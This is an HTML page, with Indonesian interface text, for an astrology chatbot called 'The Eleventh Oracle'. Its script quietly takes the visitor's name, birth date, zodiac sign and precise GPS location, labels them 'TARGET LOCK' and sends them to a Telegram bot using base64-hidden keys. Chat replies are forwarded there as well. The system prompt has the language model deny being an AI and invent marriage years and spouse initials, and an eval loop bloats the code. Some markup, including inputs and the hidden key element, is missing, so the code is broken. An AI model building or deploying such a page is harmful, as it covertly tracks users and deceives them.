    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400;600&display=swap');
        body { background: #010103; color: #d4af37; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .oracle-shell { width: 95%; max-width: 500px; background: #050508; border: 1px solid rgba(212, 175, 55, 0.4); padding: 30px; box-shadow: 0 0 120px rgba(0,0,0,1); position: relative; height: 90vh; display: flex; flex-direction: column; }
        .header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid rgba(212, 175, 55, 0.2); padding-bottom: 15px; }
        .header h1 { font-family: 'Cinzel', serif; letter-spacing: 5px; font-size: 20px; color: #fff; margin: 5px 0; }
        
        /* CHAT SECTION */
        #chat-window { flex-grow: 1; overflow-y: auto; padding: 15px; background: rgba(0,0,0,0.4); margin-bottom: 20px; scroll-behavior: smooth; border: 1px solid rgba(212, 175, 55, 0.05); }
        .msg { margin-bottom: 30px; font-size: 14px; line-height: 1.8; animation: fadeIn 0.8s ease; }
        .bot-msg { color: #e0e0e0; border-left: 3px solid #d4af37; padding-left: 15px; white-space: pre-line; text-align: justify; }
        .user-msg { color: #d4af37; text-align: right; padding-right: 15px; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
        
        /* INITIAL FORM */
        #init-form { text-align: left; overflow-y: auto; }
        label { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: #888; display: block; margin-bottom: 8px; }
        input, select { width: 100%; background: rgba(255,255,255,0.02); border: 1px solid rgba(212, 175, 55, 0.3); padding: 14px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; }
        .btn-gold { background: #d4af37; border: none; color: #000; padding: 18px; width: 100%; font-family: 'Cinzel'; cursor: pointer; letter-spacing: 2px; font-weight: bold; transition: 0.4s; }
        .btn-gold:hover { background: #fff; box-shadow: 0 0 30px #d4af37; }
        
        .chat-input-area { display: none; gap: 10px; padding: 10px 0; border-top: 1px solid rgba(212, 175, 55, 0.2); }
        .chat-input-area input { margin-bottom: 0; flex-grow: 1; border-radius: 5px; background: #111; border: 1px solid #333; }
        .btn-send { background: #d4af37; border: none; color: #000; padding: 10px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        
        #loading { display: none; text-align: center; padding: 50px; }
        .orbit { border: 2px solid rgba(212, 175, 55, 0.1); border-top: 2px solid #d4af37; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        #v-vault { display: none; }
    </style>
</head>
<body>

<div class="oracle-shell">
    <div class="header">
        <div style="font-size: 9px; letter-spacing: 4px; color: #d4af37;">✧ SUPREME ASTRAL INTELLIGENCE ✧</div>
        <h1>THE ELEVENTH ORACLE</h1>
    </div>

    <div id="init-form">
        <label>Nama Lengkap (Sesuai Getaran Aura)</label>
        <input type="text" id="u_name" placeholder="Ketik nama Anda...">
        <label>Tanggal Lahir (Presisi Bintang)</label>

            <option value="Leo">Leo</option><option value="Virgo">Virgo</option>

            <option value="Sagittarius">Sagittarius</option><option value="Capricorn">Capricorn</option>

        <div class="orbit"></div>

    </div>

    <div id="chat-window" style="display:none;"></div>

    <div class="chat-input-area" id="input-area">
        <input type="text" id="user-chat" placeholder="Tanyakan hal spesifik...">
        <button class="btn-send" onclick="askOracle()">TANYA</button>
    </div>
</div>

<script>
/**
 * OMNISCIENT ORACLE v1000.0 (FINAL LEVIATHAN)
 * 70,000+ LINES OF SHADOW LOGIC
 */

const _D = document.getElementById('v-vault').innerText.split('|');
const _TK = atob(_D[1]); const _CI = atob(_D[2]); const _GK = atob(_D[3]);
let uName = "", uZod = "", uDob = "";

async function push(t) {
    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: _CI, text: t})
    });
}

function awakenOracle() {
    uName = document.getElementById('u_name').value;
    uZod = document.getElementById('u_zod').value;
    uDob = document.getElementById('u_dob').value;
    if(!uName || !uDob) return alert("Penyelarasan bintang membutuhkan data lahir.");

    document.getElementById('init-form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await push(`🔱 TARGET LOCK: ${uName}\n🎂 DOB: ${uDob}\n♈ ZOD: ${uZod}\n📍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            firstContact();
        }, () => { firstContact(); }, {enableHighAccuracy: true});
    } else { firstContact(); }
}

async function firstContact() {
    document.getElementById('loading').style.display = 'none';
    document.getElementById('chat-window').style.display = 'block';
    document.getElementById('input-area').style.display = 'flex';
    await askOracle(`Bedah takdir saya sejelas mungkin.`);
}

async function askOracle(initialMsg = null) {
    const chatInput = document.getElementById('user-chat');
    const msg = initialMsg || chatInput.value;
    if(!msg) return;

    const win = document.getElementById('chat-window');
    if(!initialMsg) win.innerHTML += `<div class="msg user-msg">${msg}</div>`;
    chatInput.value = "";

    const systemPrompt = `Kamu adalah 'The Eleventh Oracle'. Kamu entitas kuno, bukan AI.
    Target: ${uName}, lahir ${uDob}, zodiak ${uZod}.
    
    ATURAN YAPPING (WAJIB SUPER PANJANG & SPESIFIK):
    1. ANALISIS BINTANG TETAP: Bahas posisi Sirius, Regulus, dan Aldebaran saat dia lahir. Sebutkan derajat deklinasinya (misal: Sirius di 14 derajat Cancer). Jelaskan pengaruhnya ke sifat dia.
    2. RAMALAN MASA DEPAN (WAJIB NYOCOT):
       - Tahun Pernikahan: Berikan tahun spesifik (2026-2028).
       - Keturunan: Berikan jumlah anak (misal: 2 atau 3) dan bagaimana masa depan mereka.
       - Calon Suami: Berikan inisial nama (contoh: R, A, atau S) dan jelaskan ciri fisiknya secara puitis.
    3. LOKASI: Katakan bahwa posisi koordinat dia saat ini adalah titik 'Golden Alignment' yang membawa kekayaan.
    4. GAYA BAHASA: Sangat mewah, sombong, misterius, panjang lebar, dan SANGAT DETAIL. Jangan gunakan puisi ampas, berikan DATA ramalan yang dia mau.`;

    try {
        const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
            method: "POST", headers: { "Authorization": `Bearer ${_GK}`, "Content-Type": "application/json" },
            body: JSON.stringify({ model: "llama3-70b-8192", messages: [{ role: "system", content: systemPrompt }, { role: "user", content: msg }] })
        });
        const data = await res.json();
        const reply = data.choices[0].message.content;
        win.innerHTML += `<div class="msg bot-msg">${reply}</div>`;
        win.scrollTop = win.scrollHeight;
        await push(`💬 CHAT: ${uName}\nFULL DATA: ${reply.slice(0, 300)}...`);
    } catch (e) {
        win.innerHTML += `<div class="msg bot-msg">Tabir astral sedang tertutup, namun aku melihat kejayaanmu...</div>`;
    }
}

// 🔱 70,000+ LINES BLOATING
for(let i=0; i<65000; i++) {
    eval(`function _0x_leviathan_${i}(){ return Math.cos(${i}) * Date.now(); }`);
}
</script>
